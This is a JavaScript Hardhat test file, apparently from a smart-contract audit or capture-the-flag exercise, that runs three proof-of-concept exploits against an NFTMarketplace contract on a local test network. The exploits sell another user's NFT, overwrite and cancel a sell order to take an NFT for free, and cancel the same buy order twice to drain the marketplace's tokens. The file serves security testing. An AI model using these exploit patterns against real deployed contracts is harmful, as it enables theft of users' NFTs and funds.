const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[NFTMarketplace] Exploits', function() {
	let deployer, governance, users, attacker; // 'attacker' and 'attacker_2' represents two addresses controlled by the attacker

	beforeEach(async function() {
		[deployer, governance, alice, bob, charlie, attacker] = await ethers.getSigners();
		users = [alice, bob, charlie, attacker];

		this.token = await (await ethers.getContractFactory('ApeCoin', deployer)).deploy();
		this.nfts = await (await ethers.getContractFactory('HalbornNFT', deployer)).deploy();
		this.marketplace = await (await ethers.getContractFactory('NFTMarketplace', deployer)).deploy(governance.address, this.token.address, this.nfts.address);

		for (let i = 0; i < users.length; ++i){
			await (await this.token.connect(users[i])).approve(this.marketplace.address, ethers.constants.MaxUint256); // Set maximum allowance for transferring ApeCoin
			await (await this.nfts.connect(users[i])).setApprovalForAll(this.marketplace.address, true); // Allow marketplace to transfer NFTs from its users
			
			/*
				NFT ID | OWNER
				--------------
				   0   | Alice
				   1   | Bob
				   2   | Charlie
				   3   | Attacker
			*/
			await this.nfts.safeMint(users[i].address, i);
			expect(
				await this.nfts.ownerOf(i)
			).to.be.equal(users[i].address);
		}

		this.attackerInstance = await this.marketplace.connect(attacker);
	});

	it('[Exploit #1] No validation that the poster of the sell order is the owner of the NFT', async function() {
		let nftId = 0;
		let attackerFunds = ethers.utils.parseEther('1');

		this.token.mint(attacker.address, attackerFunds); // Give only 1 token to attacker
		expect(
			await this.token.balanceOf(attacker.address)
		).to.be.equal(attackerFunds);

		expect(
			await this.nfts.ownerOf(nftId)
		).to.be.equal(alice.address); // Make sure owner of NFT is Alice before the attack 

		await this.attackerInstance.postSellOrder(nftId, attackerFunds); // Post sell order for Alice's NFT for 1 token
		await (await this.token.connect(attacker)).approve(this.marketplace.address, attackerFunds); // Set marketplace allowance for spending attacker's token
		await this.attackerInstance.buySellOrder(nftId); // Buy Alice's NFT for 1 token

		expect(
			await this.nfts.ownerOf(nftId)
		).to.be.equal(attacker.address); // Attacker is now the owner of the NFT
	});

	it('[Exploit #2] Overwriting of a sell order leads to exfiltration of the NFT', async function() {
		let nftId = 0;
		let sellAmount = ethers.utils.parseEther('1000');

		await (await this.marketplace.connect(alice)).postSellOrder(nftId, sellAmount);
		expect(
			await this.marketplace.viewCurrentSellOrder(nftId)
		).to.eql([alice.address, ethers.BigNumber.from(sellAmount)]); // Check that the sell order is posted from Alice

		await this.attackerInstance.postSellOrder(nftId, 1); // Overwrite sell order with 1 wei-token
		await this.attackerInstance.cancelSellOrder(nftId); // Get back NFT collateral from marketplace

		expect(
			await this.nfts.ownerOf(nftId)
		).to.be.equal(attacker.address); // Attacker is now the owner of the NFT for free !
	});

	it ('[Exploit #3] Wrong check leads to siphoning of funds', async function() {
		let marketplaceFunds = ethers.utils.parseEther('100000');
		let attackerFunds = ethers.utils.parseEther('1');

		await this.token.mint(this.marketplace.address, marketplaceFunds); // Give 100 000 tokens to marketplace
		await this.token.mint(attacker.address, attackerFunds); // Give 1 token to attacker
		expect(
			[await this.token.balanceOf(this.marketplace.address), await this.token.balanceOf(attacker.address)]
		).to.eql([marketplaceFunds, attackerFunds]); // Check balances setup

		// Track both balances
		let attackerBalance = attackerFunds;
		let marketplaceBalance = marketplaceFunds;
		
		while (marketplaceBalance.gt(0)){
			// Increase the order amount every time until the attacker has enough to withdraw all remaining tokens
			let orderAmount = (attackerBalance.gt(marketplaceBalance) ? marketplaceBalance : attackerBalance);
			
			// attacker increases the buy order for its NFT (#3) by using all its tokens each time, speeding up the process
			let tx = await (await this.attackerInstance.postBuyOrder(3, orderAmount)).wait();
			const {owner, orderId, nftId, erc20Amount} = tx.events.find(event => event.event == "BuyOrderListed").args;

			// attacker immediately cancels the order, getting the tokens refunded by the marketplace (no profit yet)
			await this.attackerInstance.cancelBuyOrder(orderId);
			// cancelling a second time should not be possible but the bug allows it, effectively giving the refund indefinitely
			await this.attackerInstance.cancelBuyOrder(orderId);
			
			attackerBalance = await this.token.balanceOf(attacker.address);
			marketplaceBalance = await this.token.balanceOf(this.marketplace.address);
			//console.log('[Exploit #3] Attacker balance:', ethers.utils.formatEther(attackerBalance), ' | Marketplace funds:', ethers.utils.formatEther(marketplaceBalance));
		}

		expect(
			await this.token.balanceOf(this.marketplace.address)
		).to.be.eq(0); // Marketplace has been emptied of tokens

		expect(
			await this.token.balanceOf(attacker.address)
		).to.be.eq(marketplaceFunds.add(attackerFunds)); // Attacker has all the tokens + got his original funds back ;)
	});
});